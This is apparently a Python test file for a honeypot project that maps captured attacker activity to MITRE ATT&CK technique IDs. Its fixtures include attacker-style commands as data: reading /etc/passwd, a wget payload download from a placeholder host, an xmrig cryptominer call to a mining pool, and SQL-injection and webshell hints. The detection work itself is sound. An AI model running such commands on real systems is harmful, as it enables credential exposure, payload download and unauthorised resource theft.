"""MITRE ATT&CK mapper (Phase 4). Pure-logic tests with fakes."""

from __future__ import annotations

from types import SimpleNamespace

from deceptinet.telemetry.attack_map import map_techniques


def _ev(cmd, etype="command", meta=None):
    return SimpleNamespace(event_type=etype, command=cmd, meta=meta or {})


def _cred(accepted):
    return SimpleNamespace(username="root", password="x", accepted=accepted)


def _ids(techs):
    return {t.id for t in techs}


def test_discovery_transfer_and_account():
    events = [
        _ev("ls -la /"),
        _ev("cat /etc/passwd"),
        _ev("wget http://x/m"),
        _ev("uname -a"),
        _ev("whoami"),
    ]
    ids = _ids(map_techniques(events, []))
    assert {"T1059", "T1083", "T1087", "T1105", "T1082", "T1033"} <= ids


def test_brute_force_and_valid_accounts():
    techs = map_techniques([], [_cred(False), _cred(False), _cred(True)])
    ids = _ids(techs)
    assert "T1110" in ids        # >=3 attempts / failures
    assert "T1078" in ids        # one accepted


def test_http_exploit_and_webshell():
    events = [
        _ev("POST /login", etype="http_request", meta={"attack_hints": ["sqli"]}),
        _ev("GET /shell.php", etype="http_request", meta={"attack_hints": ["webshell"]}),
    ]
    ids = _ids(map_techniques(events, []))
    assert "T1190" in ids
    assert "T1505.003" in ids


def test_cryptomining():
    events = [_ev("./xmrig --donate-level 1 -o stratum+tcp://pool:3333")]
    assert "T1496" in _ids(map_techniques(events, []))
